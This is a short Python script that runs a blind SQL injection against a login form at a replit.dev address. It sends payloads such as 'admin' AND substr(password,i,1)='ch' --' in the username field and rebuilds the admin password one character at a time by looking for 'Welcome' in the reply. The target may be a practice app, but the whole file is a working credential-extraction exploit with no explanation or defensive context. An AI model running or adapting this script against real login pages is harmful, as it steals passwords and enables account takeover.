import requests
import string

url = "https://b47bda01-bed6-420e-91a1-8bd138fd806c-00-13yryay7g98u4.sisko.replit.dev/login"
charset = string.ascii_letters + string.digits
found = ""
max_len = 20

for i in range(1, max_len + 1):
    for ch in charset:
        payload = f"admin' AND substr(password,{i},1)='{ch}' --"
        data = {'username': payload, 'password': 'irrelevant'}
        res = requests.post(url, data=data)

        if "Welcome" in res.text:
            found += ch
            print(f"[+] Found so far: {found}")
            break
    else:
        print("[*] Search ended. No more characters found.")
        break

print(f"[!] Final password: {found}")